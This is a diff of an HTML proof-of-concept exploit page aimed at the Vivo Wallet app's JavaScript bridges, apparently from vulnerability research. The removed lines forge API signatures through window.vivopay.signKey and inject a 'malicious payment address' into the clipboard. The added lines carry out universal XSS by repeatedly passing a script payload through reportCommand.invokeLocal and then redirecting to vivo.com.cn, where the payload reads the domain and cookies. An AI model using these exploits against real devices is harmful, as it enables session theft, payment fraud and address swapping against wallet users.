@@ -1,30 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
+<head><meta charset="UTF-8"><title>Vivo Wallet UXSS - reportCommand Alert</title></head>
 <body>
-<pre id="s">Exploiting...</pre>
+<pre>UXSS via reportCommand.invokeLocal - alert test</pre>
 <script>
-var log = '';
-function l(m) { log += m + '\n'; document.getElementById('s').textContent = log; }
+(function() {
+    var TARGET = "https://www.vivo.com.cn/";
+    var NAV_DELAY_MS = 200;
 
-l('Domain: ' + document.domain);
+    var payload = "alert('UXSS:'+document.domain+' cookie='+document.cookie);//";
 
-// API签名伪造
-try {
-    var sig = window.vivopay.signKey(['param1=value1', 'param2=value2', 'timestamp=12345']);
-    l('signKey result: ' + sig);
-    l('SUCCESS: Can forge API signatures from external domain!');
-} catch(e) {
-    l('signKey error: ' + e.message);
-}
+    function inject() {
+        try {
+            var data = JSON.stringify({ webErrorCatch: payload });
+            window.reportCommand.invokeLocal("xyzNotExist", data);
+        } catch(e) {}
+    }
 
-//  剪贴板注入
-try {
-    window.vivopay.clipboard('恶意收款地址/链接');
-    l('clipboard injection: SUCCESS');
-} catch(e) {
-    l('clipboard error: ' + e.message);
-}
+    for (var i = 0; i < 200; i++) {
+        setTimeout(inject, NAV_DELAY_MS + i * 10);
+    }
+
+    setTimeout(function() {
+        location.href = TARGET;
+    }, NAV_DELAY_MS);
+})();
 </script>
 </body>
 </html>
